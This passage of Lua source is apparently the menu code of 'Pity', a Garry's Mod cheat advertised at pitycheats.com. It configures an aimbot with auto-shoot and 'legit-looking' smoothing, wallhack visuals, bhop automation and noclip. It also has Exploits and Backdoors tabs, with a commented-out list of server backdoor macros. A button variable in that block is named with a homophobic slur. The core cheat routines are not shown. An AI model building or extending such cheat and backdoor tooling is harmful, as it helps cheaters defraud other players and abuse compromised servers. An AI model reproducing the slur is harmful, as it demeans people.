		for k, v in pairs( Pity.Hooks ) do
			local SubTable = string.Explode( "|", v )
			hook.Remove( SubTable[2], SubTable[3] )
		end
		table.Empty( Pity.Hooks )
		if Display then
			hook.Add( "Unloaded", "HUDPaint", RandomString(), function()
				timer.Simple( 3, function()
					hook.Remove("Unloaded")
				end)
			end)
		end
	end)
end

function ReloadPity( Display )
	UnloadPity()
	timer.Simple( 0.5, function()
		LoadPity()
		if Display then
			hook.Add( "Reloaded", "HUDPaint", function()
				timer.Simple( 3, function()
					hook.Remove("Reloaded")
				end)
			end)
		end
	end)
end

function AddSavePage( Parent, Mode )
	local ManageSaves = vgui.Create("DListView", Parent)
	ManageSaves:SetPos( 20, 70 )
	ManageSaves:SetSize( 500, 200 )
	ManageSaves:SetMultiSelect(false)
	ManageSaves:AddColumn("Title")
	ManageSaves:AddColumn("Date")
	ManageSaves.m_bHideHeaders = true


	function ManageSaves:Paint(w,h)
		surface.SetDrawColor(LightBlack)
    	surface.DrawRect(0, 0, w, h)
    	surface.SetDrawColor( DarkRed );
        surface.DrawOutlinedRect(0, 0, w, h);

  		for k, v in pairs( ManageSaves.Lines ) do
  			for id, lbl in pairs(v.Columns) do
            	lbl:SetFont("Normal")
            	lbl:SetContentAlignment(5)
            	lbl:SetColor(Color(250,250,250))
        	end
        	function v:Paint(w, h)-- Paint the lines
            	surface.SetDrawColor(SemiLightBlack)
    			surface.DrawRect(0, 0, w, h)
    			surface.SetDrawColor( DarkRed );
        		surface.DrawOutlinedRect(0, 0, w, h);
        	end
    	end
	end
	function RefreshSaveList(Location, Parent)
		Parent:Clear()
		if !file.Exists( "pity/"..Location, "DATA" ) then file.CreateDir( "pity/"..Location ) end
		if file.Exists( "pity/"..Location, "DATA" ) then
			local Files, Dirs = file.Find( "pity/"..Location.."/*", "DATA" )
			for k, v in pairs( Files ) do
				local Title = string.StripExtension(v)
				local SaveTable = string.Explode( "|", file.Read( "pity/"..Location.."/"..v, "DATA" ) )
				local Date = SaveTable[1]
				local Time = SaveTable[2]
				if Time != nil && Date != nil then
					Parent:AddLine(Title, Date.."|"..Time)
				else
					Parent:AddLine(Title, "This save has been corrupted")
				end
			end
		end
	end
	RefreshSaveList(Mode, ManageSaves)
	
	AddTextEntry( Parent, 275, 20, 275, "Input Save Title", Mode )
	AddGenericButton( Parent, "Refresh Listings", 100, 20, 475, 275, function () RefreshSaveList(Mode, ManageSaves) end )
	AddGenericButton( Parent, "Delete", 51, 20, 419, 275, function()
		if ManageSaves:GetSelectedLine() != nil then
			local SaveTitle = ManageSaves:GetLine(ManageSaves:GetSelectedLine()):GetValue(1)
			if file.Exists( "pity/"..Mode.."/"..SaveTitle..".txt", "DATA" ) then file.Delete( "pity/"..Mode.."/"..SaveTitle..".txt" ) end
			RefreshSaveList(Mode, ManageSaves)
		end
	end)
	AddGenericButton( Parent, "Load", 52, 20, 362, 275, function()
		if ManageSaves:GetSelectedLine() != nil then
			local SaveTitle = ManageSaves:GetLine(ManageSaves:GetSelectedLine()):GetValue(1)
			if file.Exists( "pity/"..Mode.."/"..SaveTitle..".txt", "DATA" ) then
				local SaveFile = file.Read( "pity/"..Mode.."/"..SaveTitle..".txt" )
				local SaveFileTable = string.Explode( "|", SaveFile )
				for k, v in pairs( SaveFileTable ) do
					if k != 1 && k != 2 then
						if ManageSaves:GetLine(ManageSaves:GetSelectedLine()):GetValue(2) != "This save has been corrupted" then
							if Mode == "Friends" then
								table.insert( Pity.FriendsList, v )
							elseif Mode == "Configs" then
								if string.Left( v, 1 ) == "{" then
									Pity.BoneOrder = util.JSONToTable( v )
								else
									local CommandTable = string.Explode( " ", v )
									if CommandTable[3] == "true" || CommandTable[3] == "false" then
										Pity.Options[CommandTable[1]] = tobool(CommandTable[3])
									elseif isnumber(tonumber(CommandTable[3])) then
										Pity.Options[CommandTable[1]] = tonumber(CommandTable[3])
									else
										Pity.Options[CommandTable[1]] = tostring(CommandTable[3])
									end
								end
							elseif Mode == "Entities" then
								table.insert( Pity.EntityVisuals, v )
							end
						end
					end
				end
				if ManageSaves:GetLine(ManageSaves:GetSelectedLine()):GetValue(2) != "This save has been corrupted" then
					if Mode == "Friends" then
						RefreshFriendsList()
					elseif Mode == "Configs" then
						ReloadPity(false)
					elseif Mode == "Entities" then
						RefreshEntsList()
					end
				end
			end
		end
	end)
	AddGenericButton( Parent, "Save", 52, 20, 305, 275, function()
		if Pity.TextEntries[Mode] != nil then
			local Files, Dirs = file.Find( "pity/"..Mode.."/*", "DATA" )
			for k, v in pairs( Files ) do
				local Title = string.StripExtension(v)
				if Title == Pity.TextEntries[Mode] then return end
			end
			if !file.Exists( "pity/"..Mode, "DATA" ) then file.CreateDir( "pity/"..Mode ) end
			if file.Exists( "pity/"..Mode, "DATA" ) then
				if tonumber( os.date("%H"), 10 ) < 12 then
					local SaveText = os.date("%d/%m/%y | %I:%M AM")
					if Mode == "Friends" then
						for k, v in pairs( Pity.FriendsList ) do
							SaveText = SaveText.."|"..v
						end
						file.Write( "pity/"..Mode.."/"..Pity.TextEntries[Mode]..".txt", SaveText)
					elseif Mode == "Configs" then
						for k, v in pairs( Pity.Options ) do
							SaveText = SaveText.."|"..k.." = "..tostring(v)
						end
						SaveText = SaveText.."|"..util.TableToJSON( Pity.BoneOrder )
						file.Write( "pity/"..Mode.."/"..Pity.TextEntries[Mode]..".txt", SaveText)
					elseif Mode == "Entities" then
						for k, v in pairs( Pity.EntityVisuals ) do
							SaveText = SaveText.."|"..v
						end
						file.Write( "pity/"..Mode.."/"..Pity.TextEntries[Mode]..".txt", SaveText)
					end
				else
					local SaveText = os.date("%d/%m/%y | %I:%M PM")
					if Mode == "Friends" then
						for k, v in pairs( Pity.FriendsList ) do
							SaveText = SaveText.."|"..v
						end
						file.Write( "pity/"..Mode.."/"..Pity.TextEntries[Mode]..".txt", SaveText)
					elseif Mode == "Configs" then
						for k, v in pairs( Pity.Options ) do
							SaveText = SaveText.."|"..k.." = "..tostring(v)
						end
						file.Write( "pity/"..Mode.."/"..Pity.TextEntries[Mode]..".txt", SaveText)
					elseif Mode == "Entities" then
						for k, v in pairs( Pity.EntityVisuals ) do
							SaveText = SaveText.."|"..v
						end
						file.Write( "pity/"..Mode.."/"..Pity.TextEntries[Mode]..".txt", SaveText)
					end
				end
			end
			RefreshSaveList(Mode, ManageSaves)
		end
	end)
	AddGenericButton( Parent, "Rename", 52, 20, 305, 300, function()
		if ManageSaves:GetSelectedLine() != nil && Pity.TextEntries[Mode] != nil then
			local SaveTitle = ManageSaves:GetLine(ManageSaves:GetSelectedLine()):GetValue(1)
			if file.Exists( "pity/"..Mode.."/"..SaveTitle..".txt", "DATA" ) then
				local Files, Dirs = file.Find( "pity/"..Mode.."/*", "DATA" )
				for k, v in pairs( Files ) do
					local Title = string.StripExtension(v)
					if Title == Pity.TextEntries[Mode] then return end
				end
				local SaveFileText = file.Read( "pity/"..Mode.."/"..SaveTitle..".txt", "DATA" )
				file.Delete( "pity/"..Mode.."/"..SaveTitle..".txt" )
				file.Write( "pity/"..Mode.."/"..Pity.TextEntries[Mode]..".txt", SaveFileText )
				RefreshSaveList(Mode, ManageSaves)
			end
		end
	end)
end

function AddKeyBind( Parent, PosX, PosY, Var )
	local KeyBind = vgui.Create( "DButton", Parent )
	if Pity.Options["Aim_AimOnKey_Key"] >= 107 && Pity.Options["Aim_AimOnKey_Key"] <= 113 then
		KeyBind:SetText( Pity.MouseBinds[Pity.Options["Aim_AimOnKey_Key"]])
	else
		KeyBind:SetText( Pity.KeyBinds[Pity.Options["Aim_AimOnKey_Key"]])
	end
	KeyBind:SetFont("Normal")
	KeyBind:SetTextColor( Color(255,255,255,255) )
	KeyBind:SetSize( 100, 15 )
	KeyBind:SetPos( PosX, PosY )
	KeyBind:SetTooltip( "Click button then press any key to change bind" )
	KeyBind.Paint = function()
	end
	KeyBind.DoClick = function()
		KeyBind:SetText("...")
		local NoClickMenu = vgui.Create( "DFrame" )
		NoClickMenu:SetTitle("")
		NoClickMenu:ShowCloseButton(false)
		NoClickMenu:SetDraggable(false)
		NoClickMenu:SetSize(ScrW(), ScrH())
		NoClickMenu:Center()
		NoClickMenu:MakePopup()
		function NoClickMenu:Paint( w, h )
			draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,0,150) )
			draw.SimpleTextOutlined( "Press any key", "Normal", w/2, h/2, Color(255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))
			draw.SimpleTextOutlined( "Press ESC to cancel", "Normal", w/2, h/2+30, Color(255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))
			draw.SimpleTextOutlined( "Hold ESC to clear bind", "Normal", w/2, h/2+60, Color(255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))
		end
		local ESCStuff, ESCNum = false, 0
		KeyBind.Think = function()
			if !ESCStuff then
				for i = 107, 113 do
					if input.IsMouseDown(i) then
						Pity.Options[Var] = i
						KeyBind:SetText(Pity.MouseBinds[i])
						NoClickMenu:Close()
						KeyBind.Think = nil
					end
				end
				for i = 0, 159 do
					if input.IsKeyDown(i) then
						if i == 70 then
							LocalPlayer():ConCommand("cancelselect")
							ESCStuff = true
						else
							Pity.Options[Var] = i
							KeyBind:SetText(Pity.KeyBinds[i])
							NoClickMenu:Close()
							KeyBind.Think = nil
						end
					end
				end
			else
				if input.IsKeyDown(70) then
					if ESCNum >= 200 then
						Pity.Options[Var] = 0
						KeyBind:SetText(Pity.KeyBinds[0])
						NoClickMenu:Close()
						KeyBind.Think = nil
					else ESCNum = ESCNum + 1 end
				else
					KeyBind:SetText(Pity.KeyBinds[Pity.Options[Var]])
					NoClickMenu:Close()
					KeyBind.Think = nil
				end
			end
		end
	end
end

function AddComboBox( Parent, PosX, PosY, SizeX, SizeY, Var, ChoiceTable, ExtraFunc )
	local AddComboBox = vgui.Create( "DComboBox", Parent )
	AddComboBox:SetFont("Normal")
	AddComboBox:SetPos( PosX, PosY )
	AddComboBox:SetColor(Color(255,255,255))
	AddComboBox:SetSize( SizeX, SizeY )
	AddComboBox:SetValue(Pity.Options[Var])
	for k, v in pairs( ChoiceTable ) do
		AddComboBox:AddChoice(v)
	end
	function AddComboBox:Paint(w, h)
		surface.SetDrawColor(Black)
    	surface.DrawRect(0, 0, w, h)
    	surface.SetDrawColor( Red );
        surface.DrawOutlinedRect(0, 0, w, h);
	end
	AddComboBox.OnSelect = function(Selected)
		Pity.Options[Var] = Selected:GetValue()
		if ExtraFunc != nil then
			ExtraFunc()
		end
	end
end

local AdminsListBool = false
local SpecsListBool = false
function AddLabel( Parent, Text, PosX, PosY, CloseOn )
	local AddLabel = vgui.Create("DLabel", Parent)
	AddLabel:SetFont("Normal")
	AddLabel:SetText( Text )
	AddLabel:SetPos( PosX, PosY )
	AddLabel:SetColor(Color(255,255,255,255))
	AddLabel:SizeToContents()
	if CloseOn != nil then
		AddLabel.Think = function()
			if CloseOn == "Admins" then
				if AdminsListBool then
					AddLabel:Remove()
				end
			elseif CloseOn == "Spectators" then
				if SpecsListBool then
					AddLabel:Remove()
				end
			end
		end
	end
	return AddLabel:GetSize()
end

function draw.OutlinedBox( x, y, w, h, thickness, clr )
	surface.SetDrawColor( clr )
	for i=0, thickness - 1 do
		surface.DrawOutlinedRect( x + i, y + i, w - i * 2, h - i * 2 )
	end
end

/*
function Pity.Backdoors.GenerateBackdoorList( parent, category )



for k, v in SortedPairs( Pity.Backdoors.Macros, false ) do

if v["Type"] != category then continue end



local plypanel2 = vgui.Create( "DPanel" )

plypanel2:SetPos( 50, 0 )

plypanel2:SetSize( 103, 15 )

plypanel2.Paint = function() -- Paint function



if selectedbackdoor == k then draw.RoundedBoxEx(0,0,0,plypanel2:GetWide(),plypanel2:GetTall(),Color(150, 150, 150, 70), false, false, false, false)
else draw.RoundedBoxEx(0,0,0,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 70), false, false, false, false)
end


end



local plyname = vgui.Create( "DLabel", plypanel2 )

plyname:SetPos( 3, 0 )

plyname:SetFont( "pity_homemini" )

local tcol = Color( 255, 255, 255 )

if v.Private then tcol = Color( 255, 107, 107 ) 

if fiji_style_menu:GetInt() == 2 then 
if v == LocalPlayer() then tcol = Color( math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75) ) end

elseif fiji_style_menu:GetInt() == 3 then
if v == LocalPlayer() then tcol = Color( 255, 91, 91 ) end

elseif fiji_style_menu:GetInt() == 1 then
if v == LocalPlayer() then  tcol = HSVToColor( CurTime() % 6 * 60, 1, 0.5 )end

else
if v == LocalPlayer() then tcol = Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) end

end
end

plyname:SetColor( tcol )

plyname:SetText( k )

plyname:SetSize(670, 15)






local faggot = vgui.Create("DButton", plypanel2)

faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )

faggot:SetPos( 0, 0 )

faggot:SetText("")

if v["Desc"] != "" then  end

faggot.Paint = function(panel, w, h)

return

end

faggot.DoClick = function()

selectedbackdoor = k

end





parent:AddItem( plypanel2 )



end



end
*/

function AddTab( Parent, Text, Tab, PosX, PosY, TabID )
	local AddMenuTab = vgui.Create( "DButton", Parent )
	AddMenuTab:SetFont("Symbol")
	AddMenuTab:SetText( Text )
	AddMenuTab:SetTextColor( Color(255,255,255) )
	AddMenuTab:SetPos( PosX, PosY )
	AddMenuTab:SetSize( 100, 55 )
	function AddMenuTab:Paint(w, h) 
		draw.RoundedBox( 0, 0, 0, w, h, SemiLightBlack )
        if AddMenuTab:IsHovered() then   	   	
        	AddMenuTab:SetTextColor( Red )	
        else
        	AddMenuTab:SetTextColor( Color(255,255,255) )
        end
	end
	AddMenuTab.DoClick = function()
		SoundClick()
		ChangeTab( Tab, TabID )
	end	
end

local blur = Material("pp/blurscreen")
local function DrawBlur(panel, amount)
    local x, y = panel:LocalToScreen(0, 0)
    local scrW, scrH = ScrW(), ScrH()
    surface.SetDrawColor(255, 255, 255)
    surface.SetMaterial(blur)
    for i = 1, 3 do
        blur:SetFloat("$blur", (i / 3) * (amount or 6))
        blur:Recompute()
        render.UpdateScreenEffectTexture()
        surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
    end
end

local MenuOpen = false
local function _Pity()
	if MenuOpen then
        	MenuOpen = false
        	Menu:Close()
		return
	end
	SoundPop()
	MenuOpen = true	

    Menu = vgui.Create( "DFrame" )
        Menu:SetSize( 805, 500 )
        Menu:Center()
        Menu:SetTitle("")
        Menu:MakePopup()
        Menu:GetBackgroundBlur()
        Menu:SetVisible(true)
        Menu:ShowCloseButton(false)
        
        function Menu:Paint(w, h)  

        	DisableClipping(true)
        	DrawBlur(self, 2)
    		draw.RoundedBox( 5, 0, 0, w, h, Color( 0, 0, 0, 200 ) )
    		DisableClipping(false)

            draw.RoundedBox( 0, 0, 0, w, h, SemiLightBlack ) // Arrière-plan
            draw.RoundedBox( 0, 0, 0, w, 25, SemiDarkRed ) // Header

            draw.OutlinedBox( 95, 32, 1, 44, 1, LightBlack ) // Separator logo
            draw.OutlinedBox( 13, 85, w - 24, 1, 2, LightBlack ) // Separator dessous

            draw.OutlinedBox( 0, 0, w, h, 5, SemiDarkRed ) // Contour

            draw.SimpleTextOutlined( "Pity", "Normal", 20, 12, Color(255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))
        end

	Logo = vgui.Create( "HTML", Menu )
	Logo:SetSize( 90,90 )
	Logo:SetPos( 24,28 )
	Logo:OpenURL( "http://image.noelshack.com/fichiers/2018/49/2/1543955270-logopity-v2transmini2.png" )

	Discord = vgui.Create( "HTML", Menu )
	Discord:SetSize( 320,76 )
	Discord:SetPos( 240,200 )
	Discord:OpenURL( "http://image.noelshack.com/fichiers/2018/49/3/1544021976-pitydiscordwidget.png" )

	local Home = vgui.Create("DPanel", Menu)
    Home:SetPos( 0 , 25 )
    Home:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
    Home:SetVisible( false )
	function Home:Paint(w, h)
		Discord:SetVisible(true)
        draw.OutlinedBox( 100, 60, 100, 1, 2, Red ) // Separator dessous
        draw.SimpleTextOutlined( "Welcome to", "Big", 370, 100, Color(255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))
        draw.SimpleTextOutlined( "Pity", "Big", 477, 100, Red,TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))
        draw.SimpleTextOutlined( "Join our discord", "Normal", 400, 150, Color(250,250,250),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))
        draw.SimpleTextOutlined( "www.pitycheats.com", "Normal", 400, h-20, Color(240,240,240),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))      
    end

    local Visuals = vgui.Create("DPanel", Menu)
    Visuals:SetPos( 0 , 25 )
    Visuals:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
    Visuals:SetVisible( false )
	function Visuals:Paint()
		Discord:SetVisible(false)
		draw.OutlinedBox( 200, 60, 100, 1, 2, Red )
		draw.OutlinedBox( 12, 84, 175, 168, 2, LightBlack )
		draw.OutlinedBox( 192, 84, 168, 147, 2, LightBlack )
    end

    local Aim = vgui.Create("DPanel", Menu)
    Aim:SetPos( 0 , 25 )
    Aim:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
    Aim:SetVisible( false )
	function Aim:Paint()
		Discord:SetVisible(false)
        draw.OutlinedBox( 300, 60, 100, 1, 2, Red )
        draw.OutlinedBox( 12, 84, 175, 148, 2, LightBlack )
		draw.OutlinedBox( 192, 84, 260, 108, 2, LightBlack )
		draw.OutlinedBox( 458, 84, 213, 67, 2, LightBlack )
    end

	local Exploits = vgui.Create("DPanel", Menu)
    Exploits:SetPos( 0 , 25 )
    Exploits:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
    Exploits:SetVisible( false )
	function Exploits:Paint()
		Discord:SetVisible(false)
		draw.OutlinedBox( 400, 60, 100, 1, 2, Red )
    end

	local Backdoors = vgui.Create("DPanel", Menu)
    Backdoors:SetPos( 0 , 25 )
    Backdoors:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
    Backdoors:SetVisible( false )
	function Backdoors:Paint()
		Discord:SetVisible(false)
		draw.OutlinedBox( 500, 60, 100, 1, 2, Red )
    end

    local Misc = vgui.Create("DPanel", Menu)
    Misc:SetPos( 0 , 25 )
    Misc:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
    Misc:SetVisible( false )
	function Misc:Paint()
		Discord:SetVisible(false)
		draw.OutlinedBox( 600, 60, 100, 1, 2, Red )
		draw.OutlinedBox( 12, 84, 255, 130, 2, LightBlack )
		draw.OutlinedBox( 283, 84, 263, 48, 2, LightBlack )
    end  

    local Options = vgui.Create("DPanel", Menu)
    Options:SetPos( 0 , 25 )
    Options:SetSize( Menu:GetWide(), Menu:GetTall()-25 )
    Options:SetVisible( false )
	function Options:Paint()
		Discord:SetVisible(false)
		draw.OutlinedBox( 700, 60, 100, 1, 2, Red )
    end

	AddTab( Menu, "A",     Home,  100, 25, 1 )
	AddTab( Menu, "B",  Visuals,  200, 25, 2 )
	AddTab( Menu, "C",      Aim,  300, 25, 3 )
	AddTab( Menu, "D", Exploits,  400, 25, 4 )
	AddTab( Menu, "F",Backdoors,  500, 25, 5 )
    AddTab( Menu, "E",     Misc,  600, 25, 6 )
    AddTab( Menu, "G",  Options,  700, 25, 7 )

	function ChangeTab ( Tab, TabID )
		Home:SetVisible(false)
        Visuals:SetVisible(false)
        Aim:SetVisible(false)
        Exploits:SetVisible(false)
        Backdoors:SetVisible(false)
        Misc:SetVisible(false)
        Options:SetVisible(false)
        
        Tab:SetVisible(true)
        Pity.ActiveTab = TabID
    end

// Aim
	AddCheckBox( Aim, "Activate", 20, 65, "Enables/Disables Aim", "Aim_Toggle" )
	AddCheckBox( Aim, "Line of sight", 20, 90, "Only aims at visible players (players within your line of sight)", "Aim_LOSCheck" )
	AddCheckBox( Aim, "Auto Wall", 20, 110, "Aim at people behind walls that can be shot through", "Aim_AutoWall")
	AddCheckBox( Aim, "Auto Shoot", 20, 130, "Automatically shoot when the Aim is locked onto someone", "Aim_AutoShoot")

	AddCheckBox( Aim, "Team", 20, 150, "Aim at/ignore players on your team", "Aim_AimTeam" )
	AddComboBox( Aim, 110, 150, 70, 15, "Aim_AimTeamV", {"Aim", "Ignore"} )

	AddCheckBox( Aim, "Opponents", 20, 170, "Aim at/ignore players on the other team", "Aim_AimOpponents" )
	AddComboBox( Aim, 110, 170, 70, 15, "Aim_AimOpponentsV", {"Aim", "Ignore"} )

	AddCheckBox( Aim, "NPCs", 20, 190, "Aim at/ignore NPCs", "Aim_AimNPCs" )
	AddComboBox( Aim, 110, 190, 70, 15, "Aim_AimNPCsV", {"Aim", "Ignore"} )

	AddCheckBox( Aim, "Spectators", 20, 210, "Aim at/ignore players who are in spectator mode", "Aim_AimSpectators" )		
	AddComboBox( Aim, 110, 210, 70, 15, "Aim_AimSpectatorsV", {"Aim", "Ignore"} )

	AddCheckBox( Aim, "Aim on key", 200, 90, "Aim only active when selected key is held down", "Aim_AimOnKey" )
	AddKeyBind( Aim, 262, 90, "Aim_AimOnKey_Key" )
	AddLabel( Aim, "Aim Priority :", 200, 110 )
	AddComboBox( Aim, 273, 110, 70, 15, "Aim_AimPriority", {"Distance", "Crosshair"} )
	AddCheckBox( Aim, "Smooth Aim", 200, 130, "Aims at other players slowly (looks more legit)", "Aim_SmoothAim")
	AddSlider( Aim, "Aim_SmoothAim_Value", 295, 130, 0, 1000, 0 )
	AddCheckBox( Aim, "Field of view", 200, 150, "Only aim at players within the selected field of view", "Aim_FOV")
	AddSlider( Aim, "Aim_FOV_Value", 295, 150, 0, 360, 0 )
	AddCheckBox( Aim, "Stick to Target", 200, 170, "Will stay aiming at the one target as long as they fall within the selected criteria above", "Aim_StickToTarget" )

	AddLabel( Aim, "Define the offsets of the aimbot.", 465, 90 )
	AddLabel( Aim, "Offset X:", 465, 110 )
	AddLabel( Aim, "Offset Y:", 465, 130 )
	AddSlider( Aim, "Aim_OffsetX", 515, 110, -100, 100, 0 )
	AddSlider( Aim, "Aim_OffsetY", 515, 130, -100, 100, 21 )

// Visuals
	AddCheckBox( Visuals, "Activate", 20, 65, "Enables/Disables Visuals", "Visuals_Toggle" )
	AddCheckBox( Visuals, "Team", 20, 90, "Draw/Ignore Visuals for players on your team", "Visuals_ShowTeam" )
	AddCheckBox( Visuals, "Opponents", 20, 110, "Draw/Ignore Visuals for players not on your team", "Visuals_ShowOpponents" )
	AddCheckBox( Visuals, "NPCs", 20, 130, "Draw/Ignore Visuals for NPCs", "Visuals_ShowNPCs" )
	AddCheckBox( Visuals, "Spectators", 20, 150, "Draw/Ignore Visuals for spectators", "Visuals_ShowSpectators" )
	AddCheckBox( Visuals, "Aimline", 20, 170, "Aimline active or not", "Aimline" )
	AddCheckBox( Visuals, "Asus Walls", 20, 190, "Asus walls active or not", "Visuals_ASUSWalls" )
	AddCheckBox( Visuals, "Hitmarker", 20, 210, "Active hitmarker or not", "Visuals_Hitmarker" )
	AddCheckBox( Visuals, "Skybox", 20, 230, "Skybox active or not", "Visuals_Skybox" )

	AddComboBox( Visuals, 108, 90, 70, 15, "Visuals_ShowTeamV", {"Show", "Ignore"} )
	AddComboBox( Visuals, 108, 110, 70, 15, "Visuals_ShowOpponentsV", {"Show", "Ignore"} )
	AddComboBox( Visuals, 108, 130, 70, 15, "Visuals_ShowNPCsV", {"Show", "Ignore"} )
	AddComboBox( Visuals, 108, 150, 70, 15, "Visuals_ShowSpectatorsV", {"Show", "Ignore"} )

	AddCheckBox( Visuals, "Boundary Boxes", 200, 90, "Display a box around players", "Visuals_BoundaryBoxes" )
	AddComboBox( Visuals, 315, 90, 35, 15, "Visuals_BoundaryBoxes_Mode", { "2D", "3D" } )
	AddCheckBox( Visuals, "Name Tags", 200, 110, "Display player names", "Visuals_NameTags" )
	AddCheckBox( Visuals, "Weapon", 200, 130, "Display equipped weapon of players", "Visuals_Weapon" )
	AddCheckBox( Visuals, "Distance", 200, 150, "Display distance between you and other players", "Visuals_Distance" )
	AddCheckBox( Visuals, "Health", 200, 170, "Display health of players", "Visuals_Health" )
	AddCheckBox( Visuals, "Skeleton", 200, 190, "Draws the skeleton of players", "Visuals_Skeleton" )
	AddCheckBox( Visuals, "Crosshair", 200, 210, "Draws crosshair on screen", "Visuals_Crosshair" )

	//AddCheckBox( Visuals, "Entity Visuals", 185, 45, "Draw Visuals for selected entities", "Visuals_Entity_Toggle" )
	//AddCheckBox( Visuals, "Name Tags", 185, 65, "Draw Visuals for selected entities", "Visuals_Entities_NameTags" )
	//AddCheckBox( Visuals, "Boundary Boxes", 185, 85, "Draw Visuals for selected entities", "Visuals_Entities_BoundaryBoxes" )
	//AddComboBox( Visuals, 295, 85, 40, 15, "Visuals_Entities_BoundaryBoxes_Mode", { "2D", "3D" } )	

// Misc
	AddCheckBox( Misc, "Activate", 20, 65, "Enables/Disables Bhop hacks", "Bhop_Toggle" )
	AddCheckBox( Misc, "Fast Walk", 20, 90, "Makes you walk slightly faster", "Bhop_FastWalk" )
	AddCheckBox( Misc, "Bunny hop", 20, 110, "Hold space to bhop", "Bhop_AutoHop" )
	AddCheckBox( Misc, "Auto Strafe", 20, 130, "Automatically turns in the air", "Bhop_AutoStrafe")
	AddCheckBox( Misc, "Edge Jump", 20, 150, "Jumps just before an edge", "Bhop_EdgeJump")
	AddSlider( Misc, "Bhop_EdgeJump_Distance", 110, 150, 0, 100, 0 )
	AddCheckBox( Misc, "Sideways", 20, 170, "Turns your camera so you can bhop normally while in Sideways mode", "Bhop_Sideways")
	AddCheckBox( Misc, "W-Only", 20, 190, "Turns your camera so you can bhop normally while in W-Only mode", "Bhop_WOnly")

	AddCheckBox( Misc, "Activate", 290, 65, "Enables/Disables cams hacks", "Cams_Toggle" )
	AddCheckBox( Misc, "Noclip", 290, 90, "Fly around the map freely (everyone else on the server wont see you flying)", "Cams_CSNoclip" )
	AddSlider( Misc, "Cams_CSNoclip_Speed", 390, 90, 0, 100, 0 )
	AddCheckBox( Misc, "Thirdperson", 290, 110, "An over shoulder view", "Cams_ThirdPerson" )
	AddSlider( Misc, "Cams_ThirdPerson_Zoom", 390, 110, 0, 100, 0 )

	AddCheckBox( Misc, "Key Visualizer", 20, 250, "Draw a Key visualizer in the top left hand corner of your screen", "Misc_KeyVisualizer")

	AddSavePage( Options, "Configs" )

    if Pity.ActiveTab == nil then 
    	Pity.ActiveTab = 1    	
    end
    if Pity.ActiveTab == 1 then     	
    	ChangeTab( Home, 1 )
    elseif Pity.ActiveTab == 2 then 
    	ChangeTab( Visuals, 2 )
    elseif Pity.ActiveTab == 3 then 
    	ChangeTab( Aim, 3 )
    elseif Pity.ActiveTab == 4 then 
    	ChangeTab( Exploitss, 4 )
    elseif Pity.ActiveTab == 5 then 
    	ChangeTab( Backdoors, 5 )
    elseif Pity.ActiveTab == 6 then 
    	ChangeTab( Misc, 6 )
    elseif Pity.ActiveTab == 7 then 
    	ChangeTab( Options, 7 )
    end

end

local MenuDelay = false
hook.Add( "Think", "Menu", function()
	if input.IsKeyDown(KEY_INSERT) && !MenuDelay then
		MenuDelay = true
		_Pity()
		timer.Simple( 0.5, function() MenuDelay = false end )
	end
end)

/*
function WelcomeScreen()
	local Popup = vgui.Create("DFrame")
		Popup:SetSize( ScrW(), ScrH() )
		Popup:SetPos( 0,0 )
		Popup:SetVisible( true )
		Popup:SetDraggable( false )
		Popup:SetTitle( "" )
		Popup:MakePopup()
		Popup:ShowCloseButton( false )
		Popup.Paint = function(s,w,h) 
		surface.SetDrawColor( Color(0,0,0,200) ) 
		surface.DrawRect( 0,0, w,h ) 
		surface.SetDrawColor( Red )
		surface.DrawRect( 0, w/2-Popup:GetTall()/1.520, ScrW(), ScrH()/6.5 )
		surface.SetTextColor(255,255,255) 
		surface.SetTextPos(w/5.10, h/2.40)
			surface.SetFont( "Big" )
			surface.SetTextPos(w/5.10, h/3)
			surface.DrawText( "Pity" )
			surface.SetFont( "Normal" ) 
			surface.SetTextPos(w/5.10, h/2.50)
			surface.DrawText( "Welcome to Pity, " ..ply:Nick() )
			surface.SetTextPos(w/5.10, h/2.40)				
			surface.DrawText( "Your version " .. version .. " is up to date," )
			surface.SetTextPos(w/5.10, h/2.30)
			surface.DrawText( "by asocial, ForDoog and Hoper.")
			surface.SetTextPos(w/5.10, h/2.20)
			surface.DrawText ( "Check out the news: www.pitycheats.com" )
	end	
	button = vgui.Create("DButton", Popup)
	button:SetSize(110,32.5)
	button:SetPos(Popup:GetWide()/2+Popup:GetWide()/10, Popup:GetTall()/2.050)
	button:SetText("")
	button.Paint = function(s,w,h) 
		surface.SetDrawColor( Color(255,255,255) ) 
		surface.DrawRect( 0,0, w,h ) 
		surface.SetDrawColor( DarkRed ) 
		surface.DrawRect( 0+3,0+3, w-6,h-6 ) 
		surface.SetTextColor(255,255,255) 
		surface.SetFont("Normal") 
		surface.SetTextPos(28.5,8) 
		surface.DrawText( "Continue" ) 
	end	
	button.DoClick = function(s,w,h) 
		Popup:Close()
		SoundClick()
	end
end

WelcomeScreen()*/
surface.PlaySound("npc/crow/alert2.wav")
Text("open the menu by pressing Insert !")
Text("check out our website : www.pitycheats.com")
Text("by Hoper, ForDoog, asocial.")
